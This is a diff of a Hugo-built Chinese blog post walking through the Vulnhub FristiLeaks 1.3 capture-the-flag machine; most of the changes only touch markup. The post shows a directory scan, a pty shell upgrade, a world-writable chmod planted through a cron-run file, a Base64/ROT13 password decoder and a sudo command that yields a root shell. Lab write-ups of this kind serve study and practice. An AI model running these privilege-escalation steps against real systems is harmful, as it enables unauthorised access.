@@ -23,7 +23,7 @@
 
 
 
-<meta name="generator" content="Hugo 0.59.1 with theme even" />
+<meta name="generator" content="Hugo 0.72.0 with theme even" />
 
 
 <link rel="canonical" href="https://dds2333.github.io/post/2020/04/15/vulnhub_fristileaks1.3/" />
@@ -35,7 +35,7 @@
 
 
 
-<link href="/sass/main.min.8c3cbcb0324c2bb4875ceccba4007cbad4b4ac8377f33af9953c3e7684534a50.css" rel="stylesheet">
+<link href="/sass/main.min.4eb71590ad024de2ebb1b5eef94cbb645b7e63e6b9c4c837355530a75e112ce1.css" rel="stylesheet">
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
 
 
@@ -47,16 +47,13 @@
 <meta property="article:modified_time" content="2020-04-15T23:06:31+08:00" />
 <meta itemprop="name" content="Vulnhub 靶机渗透之 FristLeaks_1.3">
 <meta itemprop="description" content="继续撸靶机 在不看 writeup 情况下，搞到一半，无法提权，还是老老实实看 writeup 才 Get flag. XD 靶机 https://www.vulnhub.com/entry/fristileaks-13,133/ 前期准备 运行环境：VM Workstation，VM Esxi，Vi">
-
-
 <meta itemprop="datePublished" content="2020-04-15T23:06:31&#43;08:00" />
 <meta itemprop="dateModified" content="2020-04-15T23:06:31&#43;08:00" />
 <meta itemprop="wordCount" content="888">
 
 
 
-<meta itemprop="keywords" content="Vulnhub,渗透测试," />
-<meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="Vulnhub,渗透测试," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Vulnhub 靶机渗透之 FristLeaks_1.3"/>
 <meta name="twitter:description" content="继续撸靶机 在不看 writeup 情况下，搞到一半，无法提权，还是老老实实看 writeup 才 Get flag. XD 靶机 https://www.vulnhub.com/entry/fristileaks-13,133/ 前期准备 运行环境：VM Workstation，VM Esxi，Vi"/>
 
@@ -92,7 +89,7 @@
       </a><a href="/categories/">
         <li class="mobile-menu-item">分类</li>
       </a><a href="/about/">
-        <li class="mobile-menu-item">关于我</li>
+        <li class="mobile-menu-item">关于</li>
       </a>
   </ul>
 </nav>
@@ -113,7 +110,7 @@
       </li><li class="menu-item">
         <a class="menu-item-link" href="/categories/">分类</a>
       </li><li class="menu-item">
-        <a class="menu-item-link" href="/about/">关于我</a>
+        <a class="menu-item-link" href="/about/">关于</a>
       </li>
   </ul>
 </nav>
@@ -202,10 +199,10 @@
 <p>使用 dirsearch 扫描 web 目录：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span></pre></td>
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">python3 dirsearch.py -u http://192.168.32.128/ -e php,html,js,json,.txt</pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">python3 dirsearch.py -u http://192.168.32.128/ -e php,html,js,json,.txt</code></pre></td></tr></table>
 </div>
 </div>
 <p><img src="/img/2020/04/15/dirsearch.png" alt="目录扫描" /></p>
@@ -251,10 +248,10 @@
 <p>得到反弹 shell 后，使用 python pty 获取交互式 shell(最实用之一)：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span></pre></td>
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</code></pre></td></tr></table>
 </div>
 </div>
 <p><img src="/img/2020/04/15/tty_shell.png" alt="tty_shell" /></p>
@@ -268,10 +265,10 @@
 <p>大概意思是需要在 /tmp 下创建一个 &ldquo;runthis&rdquo; 文件（touch /tmp/runthis），接着赋予执行权限：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span></pre></td>
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">echo &#34;/usr/bin/whoami &amp;&amp; chmod -R 777 /home/admin&#34; &gt; /tmp/runthis</pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">echo &#34;/usr/bin/whoami &amp;&amp; chmod -R 777 /home/admin&#34; &gt; /tmp/runthis</code></pre></td></tr></table>
 </div>
 </div>
 <p>跳转至 /home/admin/ 目录并 ls 查看：</p>
@@ -283,59 +280,59 @@
 <p>cryptpass.py：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span><span class="lnt">6
 </span><span class="lnt">7
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
 import base64,codecs,sys
 def encodeString(str):
     base64string= base64.b64encode(str)
     return codecs.encode(base64string[::-1], &#39;rot13&#39;)
 cryptoResult=encodeString(sys.argv[1])
-print cryptoResult</pre></td></tr></table>
+print cryptoResult</code></pre></td></tr></table>
 </div>
 </div>
 <p>cryptedpass.txt</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span></pre></td>
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">mVGZ3O3omkJLmy2pcuTq</pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">mVGZ3O3omkJLmy2pcuTq</code></pre></td></tr></table>
 </div>
 </div>
 <p>whoisyourgodnow.txt</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span></pre></td>
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">=RFn0AKnlMHMPIzpyuTI0ITG</pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">=RFn0AKnlMHMPIzpyuTI0ITG</code></pre></td></tr></table>
 </div>
 </div>
 <p>在 cryptpass.py 中不难发现其使用了 Base64 编码和 ROT13 加密，因此使用脚本进行解密 cryptedpass.txt 和 whoisyourgodnow.txt：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span><span class="lnt">6
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">import base64,codecs,sys
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">import base64,codecs,sys
 def decodeString(str):
     base64string = codecs.decode(str, &#39;rot13&#39;)
     return base64.b64decode(base64string[::-1])
 decryptedResult=decodeString(sys.argv[1])
-print decryptedResult</pre></td></tr></table>
+print decryptedResult</code></pre></td></tr></table>
 </div>
 </div>
 <p><img src="/img/2020/04/15/plain.png" alt="decrypt" /></p>
@@ -351,10 +348,10 @@ print decryptedResult</pre></td></tr></table>
 <p>从历史记录中可以看到 fristigod 在使用 sudo 来执行命令，直接用一条历史记录中的命令创建 shell:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span></pre></td>
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash</pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash</code></pre></td></tr></table>
 </div>
 </div>
 <p><img src="/img/2020/04/15/root.png" alt="root" /></p>
@@ -452,6 +449,15 @@ print decryptedResult</pre></td></tr></table>
 
 
 <script type="text/javascript" src="/js/main.min.d7b7ada643c9c1a983026e177f141f7363b4640d619caf01d8831a6718cd44ea.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      TeX: {equationNumbers: {autoNumber: "AMS"}},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
 
 
 
